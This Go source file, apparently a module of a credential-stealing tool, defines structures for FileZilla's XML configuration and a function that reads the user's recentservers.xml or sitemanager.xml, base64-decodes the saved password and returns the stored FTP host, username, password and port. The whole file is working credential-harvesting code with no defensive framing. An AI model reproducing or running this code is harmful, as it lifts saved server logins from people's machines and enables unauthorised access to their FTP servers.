package ftp

import (
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"io"
	"os"
)

type FileZilla struct {
	XMLName       xml.Name      `xml:"FileZilla3"`
	Version       string        `xml:"version,attr"`
	Platform      string        `xml:"platform,attr"`
	RecentServers RecentServers `xml:"RecentServers"`
}

type RecentServers struct {
	XMLName xml.Name `xml:"RecentServers"`
	Server  Server   `xml:"Server"`
}

type Server struct {
	XMLName             xml.Name `xml:"Server"`
	Host                string   `xml:"Host"`
	Port                int      `xml:"Port"`
	Protocol            int      `xml:"Protocol"`
	Type                int      `xml:"Type"`
	User                string   `xml:"User"`
	Pass                string   `xml:"Pass"`
	Logontype           int      `xml:"Logontype"`
	PasvMode            string   `xml:"PasvMode"`
	EncodingType        int      `xml:"EncodingType"`
	BypassProxy         int      `xml:"BypassProxy"`
	Name                string   `xml:"Name"`
	SyncBrowsing        int      `xml:"SyncBrowsing"`
	DirectoryComparison int      `xml:"DirectoryComparison"`
}

func FilezillaCreds() (Creds, error) {
	cred := Creds{"UNKNOWN", "UNKNOWN", "UNKNOWN", 0}
	f1 := "recentservers.xml"
	f2 := "sitemanager.xml"
	dir, err := os.UserConfigDir()
	if err != nil {
		return cred, err
	}
	path := dir + "\\FileZilla\\%s"
	path1 := fmt.Sprintf(path, f1)
	path2 := fmt.Sprintf(path, f2)
	recSerFile, fErr := os.Open(path1)
	var byteValue []byte
	if fErr != nil {
		recSerFile.Close()
		siteConFile, fErr2 := os.Open(path2)
		if fErr2 != nil {
			return cred, fErr2
		}
		defer siteConFile.Close()
		byteValue, err = io.ReadAll(siteConFile)

	} else {
		defer recSerFile.Close()
		byteValue, err = io.ReadAll(recSerFile)
	}
	if err != nil {
		return cred, err
	}
	var fz FileZilla
	xml.Unmarshal(byteValue, &fz)
	ePass := fz.RecentServers.Server.Pass
	data, err := base64.StdEncoding.DecodeString(ePass)
	if err != nil {
		return cred, err
	}
	cred.Host = fz.RecentServers.Server.Host
	cred.Username = fz.RecentServers.Server.User
	cred.Password = string(data)
	cred.Port = fz.RecentServers.Server.Port
	return cred, nil
}
